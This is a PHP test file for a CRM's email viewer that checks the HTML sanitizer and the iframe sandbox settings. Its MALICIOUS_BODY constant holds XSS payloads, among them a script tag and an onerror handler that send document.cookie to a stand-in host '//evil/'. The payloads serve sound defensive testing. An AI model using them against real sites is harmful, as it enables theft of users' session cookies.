<?php

declare(strict_types=1);

use App\Filament\Resources\PeopleResource\Pages\ViewPeople;
use App\Filament\Resources\PeopleResource\RelationManagers\EmailsRelationManager;
use App\Models\People;
use App\Models\User;
use Filament\Actions\Testing\TestAction;
use Filament\Facades\Filament;
use Livewire\Features\SupportTesting\Testable;
use Relaticle\EmailIntegration\Enums\EmailPrivacyTier;
use Relaticle\EmailIntegration\Models\ConnectedAccount;
use Relaticle\EmailIntegration\Models\Email;
use Relaticle\EmailIntegration\Support\EmailHtmlSanitizer;

mutates(EmailHtmlSanitizer::class);

beforeEach(function (): void {
    $this->owner = User::factory()->withTeam()->create();
    $this->team = $this->owner->currentTeam;

    $this->account = ConnectedAccount::withoutEvents(fn () => ConnectedAccount::factory()->create([
        'team_id' => $this->team->id,
        'user_id' => $this->owner->id,
    ]));

    $this->person = People::create([
        'team_id' => $this->team->id,
        'name' => 'Jane Doe',
        'creator_id' => $this->owner->id,
    ]);

    $this->actingAs($this->owner);
    Filament::setTenant($this->team);
});

function makeEmailWithBody(string $html): Email
{
    /** @var Email $email */
    $email = Email::factory()->create([
        'team_id' => test()->team->id,
        'user_id' => test()->owner->id,
        'connected_account_id' => test()->account->getKey(),
        'privacy_tier' => EmailPrivacyTier::FULL,
    ]);

    $email->body()->create([
        'body_text' => 'plain text',
        'body_html' => $html,
    ]);

    test()->person->emails()->attach($email);

    return $email->fresh(['body', 'participants', 'labels', 'attachments']);
}

/**
 * Render the email-view partial through its real entry point: the
 * EmailsRelationManager's ViewAction modal, where the partial is bound to the
 * Livewire component that exposes the reply/forward action it calls.
 */
function mountEmailView(Email $email): Testable
{
    return livewire(EmailsRelationManager::class, [
        'ownerRecord' => test()->person,
        'pageClass' => ViewPeople::class,
    ])->mountAction(TestAction::make('view')->table($email));
}

const MALICIOUS_BODY = '<p>hello <b>world</b></p>'
    .'<script>document.location="//evil/?c="+document.cookie</script>'
    .'<img src=x onerror="fetch(\'//evil/\'+document.cookie)">'
    .'<svg onload="alert(1)"></svg>'
    .'<a href="javascript:alert(2)">click</a>';

it('strips scripts, event handlers and javascript urls from the email view', function (): void {
    $email = makeEmailWithBody(MALICIOUS_BODY);

    mountEmailView($email)
        ->assertMountedActionModalDontSeeHtml('onerror')
        ->assertMountedActionModalDontSeeHtml('onload="alert')
        ->assertMountedActionModalDontSeeHtml('javascript:')
        ->assertMountedActionModalDontSeeHtml('document.cookie')
        ->assertMountedActionModalSeeHtml('hello');
});

it('preserves inline styles and presentational attributes used by email layouts', function (): void {
    $email = makeEmailWithBody(
        '<table bgcolor="#eeeeee" width="600"><tr>'
        .'<td align="center" style="color:#ff0000;padding:10px">'
        .'<p class="lead" style="font-weight:bold">Styled</p>'
        .'</td></tr></table>'
    );

    mountEmailView($email)
        ->assertMountedActionModalSeeHtml('bgcolor=&quot;#eeeeee&quot;')
        ->assertMountedActionModalSeeHtml('style=&quot;color:#ff0000;padding:10px&quot;')
        ->assertMountedActionModalSeeHtml('class=&quot;lead&quot;')
        ->assertMountedActionModalSeeHtml('align=&quot;center&quot;');
});

it('does not truncate email bodies larger than the sanitizer default input cap', function (): void {
    // Symfony HtmlSanitizer truncates input at 20 KB by default; real email
    // bodies routinely exceed that, so the tail of the message must survive.
    $body = '<p>START-MARKER</p>'
        .str_repeat('<p>filler paragraph to exceed the twenty kilobyte input cap</p>', 600)
        .'<p>END-MARKER-9F3A</p>';

    expect(strlen($body))->toBeGreaterThan(20_000);

    $email = makeEmailWithBody($body);

    mountEmailView($email)
        ->assertMountedActionModalSeeHtml('START-MARKER')
        ->assertMountedActionModalSeeHtml('END-MARKER-9F3A');
});

it('renders the email view iframe without a same-origin sandbox', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    mountEmailView($email)
        ->assertMountedActionModalSeeHtml('<iframe')
        ->assertMountedActionModalSeeHtml('sandbox="allow-popups allow-popups-to-escape-sandbox"')
        ->assertMountedActionModalSeeHtml('referrerpolicy="no-referrer"')
        ->assertMountedActionModalDontSeeHtml('allow-same-origin');
});

it('strips dangerous markup in the threaded email view', function (): void {
    $email = makeEmailWithBody(MALICIOUS_BODY);

    $html = view('filament.emails.email-thread', ['emails' => collect([$email])])->render();

    expect($html)
        ->not->toContain('onerror')
        ->not->toContain('javascript:')
        ->not->toContain('document.cookie');
});

it('sandboxes the threaded iframe without same-origin access', function (): void {
    $email = makeEmailWithBody('<p>body</p>');

    $html = view('filament.emails.email-thread', ['emails' => collect([$email])])->render();

    expect($html)
        ->toContain('sandbox="allow-popups allow-popups-to-escape-sandbox"')
        ->not->toContain('allow-scripts')
        ->not->toContain('allow-same-origin');
});
